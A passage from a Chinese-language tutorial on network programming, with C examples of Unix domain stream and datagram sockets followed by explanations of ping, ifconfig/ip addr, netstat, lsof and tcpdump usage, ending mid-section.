punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"usage: unixstreamclient &lt;local_path&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">int</span> sockfd<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">sockaddr_un</span> servaddr<span class="token punctuation">;</span>     sockfd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_LOCAL<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>sockfd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"create socket failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token function">bzero</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>servaddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    servaddr<span class="token punctuation">.</span>sun_family <span class="token operator">=</span> AF_LOCAL<span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">.</span>sun_path<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// sun_path 初始化，表示目标文件路径</span>     <span class="token comment">// 发起对目标套接字的 connect 调用</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">connect</span><span class="token punctuation">(</span>sockfd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>servaddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"connect failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token comment">// 从标准输入中读取字符串</span>    <span class="token keyword">char</span> send_line<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">bzero</span><span class="token punctuation">(</span>send_line<span class="token punctuation">,</span> MAXLINE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> recv_line<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>send_line<span class="token punctuation">,</span> MAXLINE<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">int</span> nbytes <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>send_line<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 向服务器端发送</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>sockfd<span class="token punctuation">,</span> send_line<span class="token punctuation">,</span> nbytes<span class="token punctuation">)</span> <span class="token operator">!=</span> nbytes<span class="token punctuation">)</span>            <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"write error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>sockfd<span class="token punctuation">,</span> recv_line<span class="token punctuation">,</span> MAXLINE<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"server terminated prematurely"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">fputs</span><span class="token punctuation">(</span>recv_line<span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>运行</p><ul><li><p>只启动客户端</p><ul><li>客户端直接报错，提示没有文件存在</li></ul></li><li><p>服务器端监听在无权限的文件路径上</p><ul><li>启动服务器端程序的用户，必须对本地监听路径有权限</li></ul></li><li><p>服务器和客户端正常启动</p><p><img src="20220505-201747.png" alt=""></p></li></ul></li></ul><h4 id="1-7-3-本地数据报套接字">1.7.3 本地数据报套接字</h4><ul><li><p>服务端</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span>  <span class="token string">"lib/common.h"</span></span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"usage: unixdataserver &lt;local_path&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">int</span> socket_fd<span class="token punctuation">;</span>    socket_fd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_LOCAL<span class="token punctuation">,</span> SOCK_DGRAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>socket_fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"socket create failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">struct</span> <span class="token class-name">sockaddr_un</span> servaddr<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>local_path <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span>local_path<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">bzero</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>servaddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    servaddr<span class="token punctuation">.</span>sun_family <span class="token operator">=</span> AF_LOCAL<span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">.</span>sun_path<span class="token punctuation">,</span> local_path<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">bind</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>servaddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"bind failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">char</span> buf<span class="token punctuation">[</span>BUFFER_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">sockaddr_un</span> client_addr<span class="token punctuation">;</span>    socklen_t client_len <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>client_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 使用 recvfrom 和 sendto 来进行数据报的收发</span>        <span class="token function">bzero</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">recvfrom</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> BUFFER_SIZE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockadd</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>client_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>client_len<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"client quit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Receive: %s \n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">char</span> send_line<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">bzero</span><span class="token punctuation">(</span>send_line<span class="token punctuation">,</span> MAXLINE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sprintf</span><span class="token punctuation">(</span>send_line<span class="token punctuation">,</span> <span class="token string">"Hi, %s"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>         size_t nbytes <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>send_line<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"now sending: %s \n"</span><span class="token punctuation">,</span> send_line<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sendto</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">,</span> send_line<span class="token punctuation">,</span> nbytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockadd</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>client_addr<span class="token punctuation">,</span> client_len<span class="token punctuation">)</span> <span class="token operator">!=</span> nbytes<span class="token punctuation">)</span>            <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"sendto error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token function">close</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>客户端</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span>  <span class="token string">"lib/common.h"</span></span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"usage: unixdataserver &lt;local_path&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">int</span> socket_fd<span class="token punctuation">;</span>    socket_fd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_LOCAL<span class="token punctuation">,</span> SOCK_DGRAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>socket_fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"socket create failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">struct</span> <span class="token class-name">sockaddr_un</span> servaddr<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>local_path <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span>local_path<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">bzero</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>servaddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    servaddr<span class="token punctuation">.</span>sun_family <span class="token operator">=</span> AF_LOCAL<span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">.</span>sun_path<span class="token punctuation">,</span> local_path<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 指定一个本地路径，以便在服务器端回包时可以正确地找到地址</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">bind</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>servaddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"bind failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">char</span> buf<span class="token punctuation">[</span>BUFFER_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">sockaddr_un</span> client_addr<span class="token punctuation">;</span>    socklen_t client_len <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>client_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">bzero</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">recvfrom</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> BUFFER_SIZE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockadd</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>client_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>client_len<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"client quit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Receive: %s \n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">char</span> send_line<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">bzero</span><span class="token punctuation">(</span>send_line<span class="token punctuation">,</span> MAXLINE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sprintf</span><span class="token punctuation">(</span>send_line<span class="token punctuation">,</span> <span class="token string">"Hi, %s"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>         size_t nbytes <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>send_line<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"now sending: %s \n"</span><span class="token punctuation">,</span> send_line<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sendto</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">,</span> send_line<span class="token punctuation">,</span> nbytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockadd</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>client_addr<span class="token punctuation">,</span> client_len<span class="token punctuation">)</span> <span class="token operator">!=</span> nbytes<span class="token punctuation">)</span>            <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"sendto error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token function">close</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>运行</p><p><img src="20220505-202723.png" alt=""></p></li></ul><h3 id="工具使用">工具使用</h3><h4 id="ping">ping</h4><ul><li><p>ping 命名来自于声呐探测，在网络上用来完成对网连通性的探测</p></li><li><p>ping 基于 ICMP 协议的查询报文类型，应答数据到达源地址之后，可以通过解析 ICMP 报文，对比序列号，计算时间戳等来完成每个发送 - 应答的显示</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210405-icmp-ping.png" alt=""></p></li><li><p>例如：使用 ping 探测和新浪网的网络连通性</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210401-ping.png" alt=""></p><ul><li>每次显示是按照 sequence 序列号排序</li><li>显示了 <strong>TTL</strong>，反映两个 IP 地址之间传输的时间</li><li>还显示了 ping 命令的统计信息，如最小时间、平均时间等</li></ul></li></ul><p>​</p><p>​</p><h4 id="ifconfig-ip-addr">ifconfig/ip addr</h4><ul><li><p>用来显示当前系统中的所有网络设备（网卡列表）</p></li><li><p>运行 ifconfig</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210401-ifconfig.png" alt=""></p><blockquote><p><strong>lo</strong> 全称 <code>loopback</code> ，又称<strong>环回接口</strong>，往往会被分配到 <strong>127.0.0.1</strong> 这个地址，用于本机通信，经过内核处理后直接返回，不会在任何网络中出现</p></blockquote></li></ul><ol><li><p>网络设备的状态标识和MTU：<code>&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</code></p><ul><li>UP：网卡开启状态</li><li>BROADCAST：网卡有广播地址，可发送广播</li><li>RUNNING：网线处于连接状态</li><li>MULTICAST：表示网卡可以发送多播包</li></ul></li><li><p>网卡的IP地址、子网掩码、广播地址</p></li><li><p>IPV6 配置信息</p></li><li><p>网卡 MAC 地址：<code>ether 52:00:74:f8:9f:56  txqueuelen 0  (Ethernet)</code></p><ul><li><p><code>ether</code>：连接类型为以太网</p></li><li><p><code>txqueuelen</code>：传输队列的长度</p></li></ul></li><li><p>网卡接受数据包的统计信息和接受错误的统计信息</p></li><li><p>网卡发送数据包的统计信息和发送错误的统计信息</p></li></ol><ul><li><p>运行 ip addr</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210208-ipaddr.png" alt=""></p></li></ul><ol><li><p><strong>scope</strong> 在 IP 地址后面， <code>global</code>说明这张网卡是可以对外的，可以接收来自各个地方的包；<code>host</code> 说明这张网卡仅仅可以供本机相互通信</p></li><li><p><strong>&lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt;</strong> 即网络设备的状态标识（net_device flags）</p><ul><li><code>LOWER_UP</code> 表示 L1 是启动的，即插着网线</li></ul></li><li><p><strong>qdisc</strong> 是排队规则（queueing discipline），内核如果需要通过某个网络接口发送数据包，需要按照接口配置的排队规则把数据包加入队列</p><ul><li><code>pfifo</code> 是最简单的规则，它不对进入的数据包做任何的处理，数据包采用先入先出的方式通过队列</li><li><code>pfifo_fast</code> 的队列包括三个波段（band），在每个波段里面使用先进先出规则，三个波段的优先级也不相同：band 0 优先级最高，band 2 最低，如果 band 0 里有数据包，系统就不会处理 band 1 里面的数据包；数据包是按照<strong>服务类型</strong>（TOS）被分配到三个波段里的（TOS 是 IP 头里面的一个字段）</li></ul></li></ol><ul><li><p>配置 IP 地址</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># net-toolssudo ifconfig eth1 10.0.0.1/24sudo ifconfig eth1 up#iproute2sudo ip addr add 10.0.0.1/24 dev eth1sudo ip link set up eth1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="netstat">netstat</h4><ul><li><p>netstat（network statistics）是在内核中访问网络连接状态及其相关信息的命令行程序，可以显示路由表、实际的网络连接和网络接口设备的状态信息，以及与 IP、TCP、UDP、ICMP 协议相关的统计数据，一般用于检验本机各端口的网络服务运行状况</p></li><li><p>命令选项</p><ul><li><em>-a</em>：列出 TCP、UDP 和 Unix 协议下所有套接字的所有连接</li><li><em>-t</em>：列出 TCP 协议的连接，可和 <em>-a</em>选项配合使用</li><li><em>-u</em>：列出 UDP 协议的连接</li><li><em>-n</em>：禁用反向域名解析，加快查询速度，用户 ID 和端口号也优先使用数字显示</li><li><em>-l</em>：只列出正在监听的连接（不能和 <em>-a</em> 选项同时使用）</li><li><em>-p</em>：查看进程信息<ul><li><em>-pe</em>：同时查看进程名和进程所属的用户名</li></ul></li><li><em>-s</em>：输出针对不同网络协议的统计信息</li></ul></li><li><p>当前所有的连接详情</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">netstat <span class="token operator">-</span>apen<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p>​</p><p>​</p><h4 id="lsof">lsof</h4><ul><li><p>常见用途之一是找出在指定的 IP 地址或者端口上打开套接字的进程</p></li><li><p>Isof 和 netstst 可以结合使用</p></li><li><p>lsof 可以找出正在使用该端口的进程，从而帮助定位问题</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">lsof <span class="token operator">-</span>i <span class="token operator">:</span><span class="token number">8080</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p>​</p><p>​</p><h4 id="tcpdump">tcpdump</h4><ul><li><p>抓包工具，具有非常强大的过滤和匹配功能</p></li><li><p>在开启抓包时 tcpdump 会自动创建一个类型为 AF_PACKET 的网络套接口，并向系统内核注册，当网卡接收到一个网络报文之后，会遍历系统中所有已经被注册的网络协议，内核接下来就会将网卡收到的报文发送给该协议的回调函数进行处理，回调函数可以把接收到的报文复制一份交给 tcpdump 程序，进行各种条件的过滤和判断后对报文进行解析输出</p></li><li><p>命令选项</p><ul><li><em>-D</em>：列出可用于抓包的接口</li><li><em>-i</em>：指定监听的网卡，<code>-i any</code> 显示所有网卡</li><li><em>-c</em>：指定要抓取的包数量</li><li><em>-nn</em>：不做主机名解析，且端口显示为数值</li><li><em>-w</em>：将抓包数据输出到文件中而不是标准输出，可以同时配合*-G time*选项使得输出文件每 time 秒就自动切换到另一个文件（保存成 cap 格式配合 wireshark）</li><li><em>-r</em>：从给定数据包文件中读取数据，使用<code>-</code>表示从标准输入中读取</li></ul></li><li><p>tcpdump 表达式：用于筛选输出</p><ul><li><p>表达式由一个或多个单元组成，每个单元一般包含 ID 的修饰符和一个 ID（数字或名称）</p></li><li><p>有三种修饰符</p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220506-tcpdump-filter.jpg" style="zoom: 50%;"><ul><li><p>proto：可选有 ip、arp、rarp、tcp、udp、icmp、ether 等，默认是所有协议的包</p></li><li><p>dir：可选有 src、dst、src or dst、src and dst，默认为 src or dst</p></li><li><p>type：可选有 host、net、port、portrange，默认为 host</p></li></ul></li><li><p>表达式单元之间可以使用操作符 <code>and / &amp;&amp; / or / || / not / !</code> 进行连接，从而组成复杂的条件表达式</p></li><li><p>在表达式中出现的 shell 元字符建议使用单引号包围</p></li></ul></li><li><p>示例：</p><ul><li><p>查看 TCP，且端口是 80，来自 IP 地址为 192.168.1.25 的包</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tcpdump <span class="token string">'tcp and port 80 and src host 192.168.1.25'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查看 TCP，设置了 SYN 分节的且端口是 80 的包</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">tcpdump <span class="token string">'tcp and port 80 and tcp[13:1]&amp;2 != 0'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>tcp[13:1]</code> 表示的是 TCP 头部开始处偏移为 13 的字节，如果这个值为 2，说明设置了 SYN 分节</li></ul></li></ul></li><li><p>输出格式</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210401-tcpdump-output.jpg" alt=""></p><ul><li><p><code>Flags [ ]</code> 是包的标志，比较常见的包格式如下：</p><ul><li><code>[S]</code>：SYN，表示开始连接</li><li><code>[.]</code>：没有标记，一般是确认</li><li><code>[P]</code>：PSH，表示数据推送</li><li><code>[F]</code>：FIN，表示结束连接</li><li><code>[R]</code>：RST，表示重启连接</li></ul></li><li><p>seq：包序号，就是 TCP 